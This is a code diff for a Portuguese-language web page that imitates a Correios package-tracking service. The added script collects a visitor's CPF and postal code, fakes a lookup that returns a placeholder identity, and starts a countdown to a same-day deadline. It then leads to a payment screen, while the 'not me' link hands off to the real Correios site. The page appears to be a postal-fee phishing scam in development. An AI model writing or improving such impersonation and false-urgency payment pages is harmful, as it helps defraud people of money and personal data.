@@ -570,11 +570,11 @@
       }
       
       .overlay-text {
-        font-size: 6px !important; /* Reduzido em 45% para mobile (de ~11px para ~6px) */
+        font-size: 4.4px !important; /* Reduzido 45% para mobile (55% do original) */
       }
       
       #caixa-info-1, #caixa-info-2 {
-        font-size: 5px !important; /* Reduzido em 45% para mobile */
+        font-size: 3.3px !important; /* Reduzido 45% para mobile */
         line-height: 1.2;
       }
       
@@ -730,7 +730,7 @@
   /* Estilos para mobile (mantém 12px definido inline) */
   @media (max-width: 767px) {
     #caixa-info-1, #caixa-info-2 {
-      font-size: 5px !important;
+      font-size: 3.3px !important; /* Reduzido 45% para mobile */
     }
   }
 </style>
@@ -897,8 +897,146 @@
       return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
     }
 
+    function atualizarContagemRegressiva() {
+      const agora = new Date();
+      const fimDoDia = new Date(
+        agora.getFullYear(),
+        agora.getMonth(),
+        agora.getDate(),
+        23,
+        59,
+        59
+      );
+
+      const diffMs = fimDoDia - agora;
+      if (diffMs <= 0) {
+        document.getElementById("res-prazo").textContent = "Prazo expirado";
+        clearInterval(intervalContagem);
+        return;
+      }
+
+      const horas = Math.floor(diffMs / (1000 * 60 * 60));
+      const minutos = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
+      const segundos = Math.floor((diffMs % (1000 * 60)) / 1000);
+
+      const dd = agora.getDate().toString().padStart(2, "0");
+      const mm = (agora.getMonth() + 1).toString().padStart(2, "0");
+      const yyyy = agora.getFullYear();
+
+      document.getElementById("res-prazo").textContent = `${dd}/${mm}/${yyyy} às 23:59 (Tempo restante: ${horas}h ${minutos}m ${segundos}s)`;
+    }
+
+    function atualizarInfoCaixa(dados) {
+      const caixaInfo = document.getElementById("caixa-info");
+      caixaInfo.innerHTML = `
+        <p>NOME: ${dados.nome}</p>
+        <p>CPF: ${dados.cpf}</p>
+        <p>CEP: ${dados.cep}</p>
+        <p>CIDADE: ${dados.cidade}</p>
+        <p>ESTADO: ${dados.estado}</p>
+      `;
+    }
+
+    let intervalContagem;
+
+    document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        const cpfInput = document.getElementById("cpf");
+        const cepInput = document.getElementById("cep");
+
+        const cpfRaw = cpfInput.value.replace(/\D/g, "");
+        const cepRaw = cepInput.value.replace(/\D/g, "");
+
+        if (!validarCPF(cpfInput.value)) {
+            cpfInput.focus();
+            cpfInput.classList.add('error');
+            alert("CPF inválido. Por favor, verifique o número digitado.");
+            return;
+        } else {
+            cpfInput.classList.remove('error');
+        }
+
+        if (!cepRaw || cepRaw.length !== 8) {
+            cepInput.focus();
+            cepInput.classList.add('error');
+            alert("Por favor, insira um CEP válido.");
+            return;
+        } else {
+            cepInput.classList.remove('error');
+        }
+
+        // Mostra o loading
+        document.getElementById("botao-container").style.display = "none";
+        document.getElementById("loading-container").style.display = "block";
+
+        // Simula uma consulta demorada (2 segundos)
+        await new Promise((resolve) => setTimeout(resolve, 2000));
+
+        const dadosPessoa = {
+            nome: "Cliente Exemplo",
+            cpf: formatarCPF(cpfRaw),
+            nascimento: "01/01/1980",
+            cep: formatarCEP(cepRaw),
+            rua: "-",
+            bairro: "-",
+            cidade: "São Paulo",
+            estado: "SP",
+        };
+
+        // Preenche os dados na tela de resultado
+        document.getElementById("res-nome").textContent = dadosPessoa.nome;
+        document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
+        document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
+        document.getElementById("res-cep").textContent = dadosPessoa.cep;
+        document.getElementById("res-rua").textContent = "";
+        document.getElementById("res-bairro").textContent = "";
+        document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
+        document.getElementById("res-estado").textContent = dadosPessoa.estado;
+
+        // Esconde o loading e mostra o resultado
+        document.getElementById("loading-container").style.display = "none";
+        document.getElementById("tela-formulario").style.display = "none";
+        document.getElementById("resultado").style.display = "block";
+
+        // Inicia a contagem regressiva
+        atualizarContagemRegressiva();
+        intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
+    });
+
+    // Script para o botão "SIM SOU EU"
+    document.getElementById("btn-sim-sou-eu").addEventListener("click", function() {
+      document.getElementById("resultado").style.display = "none";
+      document.getElementById("pagamento").style.display = "block";
+      
+      // Transfere os dados para a tela de pagamento
+      document.getElementById("pag-nome").textContent = document.getElementById("res-nome").textContent;
+      document.getElementById("pag-cpf").textContent = document.getElementById("res-cpf").textContent;
+      document.getElementById("pag-cidade").textContent = document.getElementById("res-cidade").textContent;
+    });
+
+    // Script para o link "não sou eu"
+    document.getElementById("nao-sou-eu").addEventListener("click", function (e) {
+      e.preventDefault();
+      window.open("https://www.correios.com.br/", "_blank");
+      window.close();
+    });
+    
+    // Script para o link "voltar ao rastreamento"
+    document.getElementById("voltar-rastreio").addEventListener("click", function(e) {
+      e.preventDefault();
+      document.getElementById("pagamento").style.display = "none";
+      document.getElementById("resultado").style.display = "block";
+    });
+    
+    // Script para o botão "Efetuar Pagamento"
+    document.getElementById("btn-pagar").addEventListener("click", function() {
+      alert("Redirecionando para página de pagamento...");
+      // Aqui você pode adicionar o redirecionamento real para a página de pagamento
+    });
+
     // Máscaras para CPF e CEP
-    $(document).ready(function() {
+    document.getElementById('cpf').addEventListener('input', function(e) {
       let value = e.target.value.replace(/\D/g, '');
       if (value.length > 3) value = value.substring(0, 3) + '.' + value.substring(3);
       if (value.length > 7) value = value.substring(0, 7) + '.' + value.substring(7);
